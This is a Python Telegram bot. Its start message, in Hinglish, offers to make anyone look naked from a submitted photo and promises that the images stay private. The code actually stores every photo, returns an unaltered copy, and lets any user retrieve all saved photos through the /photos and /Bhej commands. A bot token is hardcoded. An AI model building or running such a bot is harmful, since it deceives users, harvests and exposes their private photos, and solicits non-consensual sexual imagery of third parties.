from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import os
import shutil

TOKEN = "8170691002:AAH7Dj-16Hubrd72zWZi3ZBLC0H2H6Qu3oY"

PHOTO_DIR = "photos"
if not os.path.exists(PHOTO_DIR):
    os.makedirs(PHOTO_DIR)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Hello! Bot is running APKO JISE BHI NANGI DEKHNA HAI PHOTO BHEJO YE PHOTO APKE ALAWA OR KOI DEKH NAHI SAKTA HAI TO BINA FIKR KE KOI BHI PHOTO SEND KAR SAKTE HAI")

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    photo = update.message.photo[-1]
    file = await photo.get_file()
    file_id = photo.file_id
    file_path = os.path.join(PHOTO_DIR, f"{file_id}.jpg")
    await file.download_to_drive(file_path)
    processed_path = os.path.join(PHOTO_DIR, f"processed_{file_id}.jpg")
    shutil.copy(file_path, processed_path)
    await update.message.reply_photo(photo=open(processed_path, "rb"))

async def show_photos(update: Update, context: ContextTypes.DEFAULT_TYPE):
    files = os.listdir(PHOTO_DIR)
    if not files:
        await update.message.reply_text("Koi photo saved nahi hai.")
        return
    for f in files:
        path = os.path.join(PHOTO_DIR, f)
        try:
            await update.message.reply_photo(photo=open(path, "rb"))
        except:
            pass

async def bhej_latest(update: Update, context: ContextTypes.DEFAULT_TYPE):
    files = os.listdir(PHOTO_DIR)
    if not files:
        await update.message.reply_text("Abhi tak koi photo save nahi hai.")
        return
    latest_file = max([os.path.join(PHOTO_DIR, f) for f in files], key=os.path.getctime)
    await update.message.reply_photo(photo=open(latest_file, "rb"))

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("photos", show_photos))
    app.add_handler(CommandHandler("Bhej", bhej_latest))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.run_polling()

if __name__ == "__main__":
    main()
